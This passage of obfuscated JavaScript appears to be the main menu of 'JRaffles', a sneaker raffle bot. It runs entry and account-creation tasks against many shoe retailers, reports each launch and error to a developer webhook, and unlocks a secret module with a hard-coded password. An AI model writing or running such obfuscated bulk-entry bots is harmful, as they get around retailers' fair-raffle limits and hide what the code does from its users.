    for (var _0x6b1b38 = 0x0; _0x6b1b38 < _0x34dd79['length']; _0x6b1b38++) {
        var _0x32663 = _0x34dd79[_0x6b1b38]['Store'], _0xf296bd = _0x34dd79[_0x6b1b38]['Mode'];
        for (var _0x5a6349 of _0x3d5832) {
            const _0xd374cc = _0x5a6349['name']['includes'](_0x32663);
            if (_0xd374cc)
                for (mode of _0x3d5832[_0x5a6349]['modules']) {
                    const _0x41adc8 = mode['name']['includes'](_0xf296bd);
                    _0x41adc8 && (_0x19f4d2 = mode['name'], await mode['function'](_0x19f4d2, _0x34dd79[_0x6b1b38], _0x250187));
                }
        }
    }
}
async function _0x88e151() {
    await _0x439f5a(), console['clear'](), _0x51f80a['threads'] = 0x1;
    if (_0x585daf != 'devkey') {
        let _0x39bd92 = await _0x4b24a1['autoUpdate']();
        if (_0x39bd92 === 'yes')
            return _0x46006b('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x444f9b == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xf987cc(0x2710);
        ;
    }
    await _0x1e58b9(_0x444f9b);
    if (_0x2c10cc === ![])
        return console['log']('Closing\x20Browser'), await _0xf987cc(0xbb8);
    else
        try {
            var _0x2ab881 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x5ad930
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x585daf
                    }
                ]
            }];
            const _0x3480a3 = { 'embeds': _0x2ab881 };
            var _0x40d69f = await _0x539676(null, null, 'open', ![]);
            const _0xf16db8 = { 'openDEVMSG': { 'embeds': [_0x40d69f] } };
            await _0x215470(_0x17d134, _0xf16db8['openDEVMSG']);
            async function _0x70d289() {
                _0x5c316f('JRaffles\x20' + _0x585daf), console['clear'](), console['log']('Hello\x20' + _0x2c0b56['cyan']('' + _0x5ad930) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x585daf), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x499b50 = 0x0; _0x499b50 < _0x3d5832['length'] - 0x4; _0x499b50++) {
                    if (_0x499b50 >= 0xa) {
                        console['log']('\x20(' + _0x499b50 + ')\x20[' + _0x3d5832[_0x499b50]['name'] + ']');
                        continue;
                    }
                    if (_0x3d5832[_0x499b50]['name'] === 'Reload\x20Settings' || _0x3d5832[_0x499b50]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x499b50 + ')\x20\x20[' + _0x3d5832[_0x499b50]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x3d5832['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x3d5832['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x3d5832['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x3d5832['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x22af56();
                if (taskModule > _0x3d5832['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xf987cc(0x3e8), _0x70d289();
                if (_0x3d5832[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                    var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x275d37 = await _0x3a4071();
                            await _0x757918['function'](_0x757918, _0x275d37);
                        }
                        if (taskFunction == 0x2) {
                            var _0x275d37 = await _0x3a4071(), _0x42f9b7 = await _0x39dc5d(_0x757918);
                            _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x42f9b7), await _0x757918['function'](_0x757918, _0x42f9b7, _0x275d37);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x275d37 = await _0x3a4071(), _0x42f9b7 = await _0x39dc5d(_0x757918);
                                _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x42f9b7), await _0x757918['function'](_0x757918, _0x42f9b7, _0x275d37);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x275d37 = await _0x3a4071();
                                    await _0x757918['function'](_0x757918, _0x275d37);
                                }
                            }
                        }
                    } catch (_0x3f76ba) {
                        console['log'](_0x3f76ba), await _0xf987cc(0x7d0);
                    }
                    return _0x70d289();
                }
                if (_0x3d5832[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                        var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x275d37 = await _0x3a4071(), _0x3c9c0f = await _0x39dc5d(_0x757918);
                            _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x3c9c0f), await _0x757918['function'](_0x757918, _0x3c9c0f, _0x275d37);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x275d37 = await _0x3a4071(), _0x3c9c0f = await _0x39dc5d(_0x757918);
                                _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x3c9c0f), await _0x757918['function'](_0x757918, _0x3c9c0f, _0x275d37);
                            }
                        }
                    } catch (_0x3f164d) {
                        console['log'](_0x3f164d), await _0xf987cc(0xfa0);
                    }
                    return _0x70d289();
                }
                if (_0x3d5832[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                        var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x275d37 = await _0x3a4071(), _0x3c9c0f = await _0x39dc5d(_0x757918);
                            _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x3c9c0f), await _0x757918['function'](_0x757918, _0x3c9c0f, _0x275d37);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x275d37 = await _0x3a4071(), _0x3c9c0f = await _0x39dc5d(_0x757918);
                                _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x3c9c0f), await _0x757918['function'](_0x757918, _0x3c9c0f, _0x275d37);
                            }
                        }
                    } catch (_0x3d75f9) {
                        console['log'](_0x3d75f9), await _0xf987cc(0xfa0);
                    }
                    return _0x70d289();
                }
                if (_0x3d5832[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                    var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x275d37 = await _0x3a4071();
                        return await _0x757918['function'](_0x757918, _0x275d37), _0x70d289();
                    }
                    var _0x275d37 = await _0x3a4071(), _0x2cd8e1 = await _0x39dc5d(_0x757918);
                    return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x2cd8e1), await _0x757918['function'](_0x757918, _0x2cd8e1, _0x275d37), _0x70d289();
                }
                if (_0x3d5832[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                    var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x275d37 = await _0x3a4071(), _0x2cd8e1 = await _0x39dc5d(_0x757918);
                    return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x2cd8e1), await _0x757918['function'](_0x757918, _0x2cd8e1, _0x275d37), _0x70d289();
                }
                if (_0x3d5832[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                    var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x275d37 = await _0x3a4071(), _0x2cd8e1 = await _0x39dc5d(_0x757918);
                    return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x2cd8e1), await _0x757918['function'](_0x757918, _0x2cd8e1, _0x275d37), _0x70d289();
                }
                if (_0x3d5832[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                    var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x275d37 = await _0x3a4071(), _0x2cd8e1 = await _0x39dc5d(_0x757918);
                    return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x2cd8e1), await _0x757918['function'](_0x757918, _0x2cd8e1, _0x275d37), _0x70d289();
                } else {
                    if (_0x3d5832[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                        var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x275d37 = await _0x3a4071(), _0x4a05de = await _0x39dc5d(_0x757918);
                            return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x4a05de), await _0x757918['function'](_0x757918, _0x4a05de, _0x275d37), _0x70d289();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x275d37 = await _0x3a4071();
                                return await _0x757918['function'](_0x757918, null, _0x275d37), _0x70d289();
                            }
                        }
                        ;
                    } else {
                        if (_0x3d5832[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                            var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction], _0x275d37 = await _0x3a4071(), _0x416020 = await _0x39dc5d(_0x757918);
                            return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x416020), await _0x757918['function'](_0x757918, _0x416020, _0x275d37), await _0xf987cc(0x1388), _0x70d289();
                        } else {
                            if (_0x3d5832[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                                var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x275d37 = await _0x3a4071(), _0x4a05de = await _0x39dc5d(_0x757918);
                                    return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x4a05de), await _0x757918['function'](_0x757918, _0x4a05de, _0x275d37), _0x70d289();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x275d37 = await _0x3a4071();
                                        return await _0x757918['function'](_0x757918, null, _0x275d37), _0x70d289();
                                    }
                                }
                                ;
                            } else {
                                if (_0x3d5832[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                                    var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x757918);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x3d5832[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                                        var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x275d37 = await _0x3a4071(), _0x2a112e = await _0x39dc5d(_0x757918);
                                            return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x2a112e), await _0x757918['function'](_0x757918, _0x2a112e, _0x275d37), _0x70d289();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x275d37 = await _0x3a4071(), _0x2a112e = await _0x39dc5d(_0x757918);
                                                return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x2a112e), await _0x757918['function'](_0x757918, _0x2a112e, _0x275d37), _0x70d289();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x3d5832[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                                            var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x275d37 = await _0x3a4071(), _0x34e3eb = await _0x39dc5d(_0x757918);
                                                return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x34e3eb), await _0x757918['function'](_0x757918, _0x34e3eb, _0x275d37), _0x70d289();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x275d37 = await _0x3a4071(), _0x34e3eb = await _0x39dc5d(_0x757918);
                                                    return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x34e3eb), await _0x757918['function'](_0x757918, _0x34e3eb, _0x275d37), _0x70d289();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x3d5832[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                                                var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x275d37 = await _0x3a4071(), _0x35edef = await _0x39dc5d(_0x757918);
                                                    return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x35edef), await _0x757918['function'](_0x757918, _0x35edef, _0x275d37), _0x70d289();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x275d37 = await _0x3a4071(), _0x35edef = await _0x39dc5d(_0x757918);
                                                        return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x35edef), await _0x757918['function'](_0x757918, _0x35edef, _0x275d37), _0x70d289();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x3d5832[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                                                    var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x275d37 = await _0x3a4071(), _0x3d2057 = await _0x39dc5d(_0x757918);
                                                        return _0x51f80a['shuffleTasks'] && await _0x37d4dd(_0x3d2057), await _0x757918['function'](_0x757918, _0x3d2057, _0x275d37), _0x70d289();
                                                    }
                                                } else {
                                                    if (_0x3d5832[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0xf987cc(0x3e8), _0x70d289();
                                                    else {
                                                        if (_0x3d5832[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x3b5745 = _0x3d5832[taskModule]['name'], _0x275d37 = await _0x3a4071();
                                                            return await _0x48b106(_0x3b5745, _0x275d37), _0x70d289();
                                                        } else {
                                                            if (_0x3d5832[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x5c91d0(_0x3d5832[taskModule]['modules']);
                                                                var _0x757918 = _0x3d5832[taskModule]['modules'][taskFunction];
                                                                return await _0x757918['function'](_0x757918), _0x70d289();
                                                            } else {
                                                                if (_0x3d5832[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x37c234 = 0x0;
                                                                    for (const _0x3db192 in _0x51f80a) {
                                                                        console['log']('(' + _0x37c234 + ')\x20' + _0x3db192 + '\x20:\x20' + _0x51f80a[_0x3db192]), _0x37c234++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x37c234 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x4e6629 = await _0x3bac9e();
                                                                    if (_0x4e6629 == _0x37c234)
                                                                        return _0x70d289();
                                                                    console['clear'];
                                                                    var _0x3dd3ad = 0x0;
                                                                    for (var _0x24043a in _0x51f80a) {
                                                                        if (_0x4e6629 == _0x3dd3ad) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x24043a + '\x20:'), _0x51f80a[_0x24043a] = await _0x1ca085(), _0x3f8380['writeFileSync']('../settings.json', JSON['stringify'](_0x51f80a));
                                                                            break;
                                                                        } else
                                                                            _0x3dd3ad++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0xf987cc(0xbb8), _0x70d289();
                                                                } else {
                                                                    if (_0x3d5832[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x439f5a(), _0x70d289();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x3d5832[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x1422eb = await _0x43fc53();
                                                                            _0x1422eb == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x34d0f3(), await afewFunction(_0x248667[_0x42dcfb], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xf987cc(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x70d289();
            } catch (_0x3f35f3) {
                return console['log'](_0x3f35f3), _0x70d289();
            }
        } catch (_0x38cac2) {
            return console['log'](_0x38cac2), await _0xf987cc(0x3a98);
        }
}
;
_0x5c316f('JRaffles\x20' + _0x585daf), _0x439f5a();
try {
    _0x88e151();
} catch (_0x347aed) {
    var _0x2e30ea = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x5ad930
            },
            {
                'name': 'Version',
                'value': '' + _0x585daf
            },
            {
                'name': 'Error',
                'value': '' + _0x347aed
            }
        ]
    }];
    const _0x4b57b6 = { 'embeds': _0x2e30ea };
    _0x215470(_0x1dec8a, _0x4b57b6);
}